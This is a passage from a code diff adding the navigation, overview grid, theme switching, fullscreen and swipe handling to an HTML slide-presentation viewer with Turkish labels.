+            updateOverviewActive();
+        }
+
+        function buildOverviewGrid() {
+            gridOverview.innerHTML = '';
+            slides.forEach((slide, idx) => {
+                const card = document.createElement('div');
+                card.className = `thumb-card ${idx === currentIndex ? 'active' : ''}`;
+                card.innerHTML = `
+                    <div class="thumb-num">Slayt ${idx + 1}</div>
+                    <div class="thumb-title">${slide.baslik || 'Başlıksız'}</div>
+                `;
+                card.onclick = () => {
+                    renderSlide(idx);
+                    overviewModal.classList.remove('active');
+                };
+                gridOverview.appendChild(card);
+            });
+        }
+
+        function updateOverviewActive() {
+            const cards = gridOverview.querySelectorAll('.thumb-card');
+            cards.forEach((c, idx) => {
+                if (idx === currentIndex) c.classList.add('active');
+                else c.classList.remove('active');
+            });
+        }
+
+        prevBtn.onclick = () => renderSlide(currentIndex - 1);
+        nextBtn.onclick = () => renderSlide(currentIndex + 1);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === 'Space' || e.key === 'PageDown') {
+                e.preventDefault();
+                renderSlide(currentIndex + 1);
+            } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+                e.preventDefault();
+                renderSlide(currentIndex - 1);
+            } else if (e.key === 'Home') {
+                e.preventDefault();
+                renderSlide(0);
+            } else if (e.key === 'End') {
+                e.preventDefault();
+                renderSlide(slides.length - 1);
+            } else if (e.key === 'f' || e.key === 'F') {
+                toggleFullscreen();
+            } else if (e.key === 'm' || e.key === 'M' || e.key === 'o' || e.key === 'O') {
+                toggleOverview();
+            } else if (e.key === 't' || e.key === 'T') {
+                toggleTheme();
+            }
+        });
+
+        function toggleOverview() {
+            buildOverviewGrid();
+            overviewModal.classList.toggle('active');
+        }
+
+        function toggleTheme() {
+            const current = document.documentElement.getAttribute('data-theme');
+            const next = current === 'dark' ? 'light' : 'dark';
+            document.documentElement.setAttribute('data-theme', next);
+            themeToggle.textContent = next === 'dark' ? '☀️' : '🌙';
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            } else {
+                document.exitFullscreen().catch(() => {});
+            }
+        }
+
+        overviewToggle.onclick = toggleOverview;
+        closeModal.onclick = () => overviewModal.classList.remove('active');
+        themeToggle.onclick = toggleTheme;
+        fullscreenToggle.onclick = toggleFullscreen;
+
+        let touchStartX = 0;
+        document.addEventListener('touchstart', e => touchStartX = e.changedTouches[0].screenX);
+        document.addEventListener('touchend', e => {
+            let touchEndX = e.changedTouches[0].screenX;
+            if (touchStartX - touchEndX > 50) renderSlide(currentIndex + 1);
+            if (touchEndX - touchStartX > 50) renderSlide(currentIndex - 1);
+        });
+
+        renderSlide(0);
+        buildOverviewGrid();
+    </script>
+</body>
+</html>
